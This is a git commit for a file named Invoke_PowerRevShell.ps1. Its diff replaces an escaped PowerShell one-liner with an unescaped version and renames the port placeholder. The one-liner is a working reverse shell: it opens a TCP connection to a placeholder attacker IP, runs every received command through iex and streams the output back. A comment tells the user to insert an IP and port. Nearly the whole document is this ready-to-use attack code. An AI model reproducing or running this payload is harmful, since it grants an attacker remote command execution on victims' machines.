bd43a169f01ff7d446f10ae2e1b165d41ab550b0
0iphor13 <79219148+0iphor13@users.noreply.github.com>
2021-08-05 11:08:20 +0200

    Update Invoke_PowerRevShell.ps1

--- Invoke_PowerRevShell.ps1
+++ Invoke_PowerRevShell.ps1
@@ -2,4 +2,4 @@
 #Don't forget to insert IP & Portnumber
 #Author: Unknown
 
-\$client = New-Object System.Net.Sockets.TCPClient('ATTACKER-IP',PORTNUMBER);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()
+$client = New-Object System.Net.Sockets.TCPClient('ATTACKER-IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
